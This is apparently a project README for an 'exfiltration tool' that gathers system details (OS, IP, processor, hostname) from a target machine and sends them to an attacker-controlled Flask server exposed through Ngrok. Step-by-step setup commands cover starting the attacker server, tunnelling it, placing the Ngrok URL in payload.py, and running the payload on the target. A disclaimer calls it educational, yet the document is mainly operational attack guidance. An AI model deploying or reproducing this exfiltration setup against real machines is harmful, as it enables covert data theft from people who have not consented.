# üöÄ System Info Exfiltration Tool

## üìå Overview
This project demonstrates a **system information exfiltration tool** that collects basic system details from a target machine and sends it to a remote server via Flask and Ngrok.

> **‚ö† Disclaimer:** This project is intended **only for educational and ethical penetration testing purposes**. Unauthorized use is strictly prohibited and may lead to legal consequences. Use responsibly.

## üõ† Features
- Collects system information (OS, IP, processor, hostname, etc.)
- Sends data to a remote Flask server
- Uses **Ngrok** for public accessibility
- Saves received data in `exfiltrated_data.txt`

## üîß Setup & Installation

### 1Ô∏è‚É£ **Clone the Repository**
```bash
git clone https://github.com/yourusername/system-info-exfiltration.git
cd system-info-exfiltration
```

### 2Ô∏è‚É£ **Install Dependencies**
Ensure you have **Python 3+** installed, then install required libraries:
```bash
pip install flask requests
```

### 3Ô∏è‚É£ **Start the Flask Server** (Attacker Machine)
```bash
python server.py
```
You should see:
```
Running on http://0.0.0.0:8080
```

### 4Ô∏è‚É£ **Start Ngrok for Public Access**
In a new terminal, run:
```bash
ngrok http 8080
```
Copy the **Ngrok Forwarding URL** (e.g., `https://randomstring.ngrok.io`).

### 5Ô∏è‚É£ **Update `payload.py` with Your Ngrok URL**
Replace:
```python
NGROK_URL = "https://your-ngrok-url.ngrok.io"
```
with your actual Ngrok forwarding URL.

### 6Ô∏è‚É£ **Run the Payload on the Target Machine**
```bash
python payload.py
```

### 7Ô∏è‚É£ **View Exfiltrated Data**
Check `exfiltrated_data.txt` on the server:
```bash
cat exfiltrated_data.txt
```
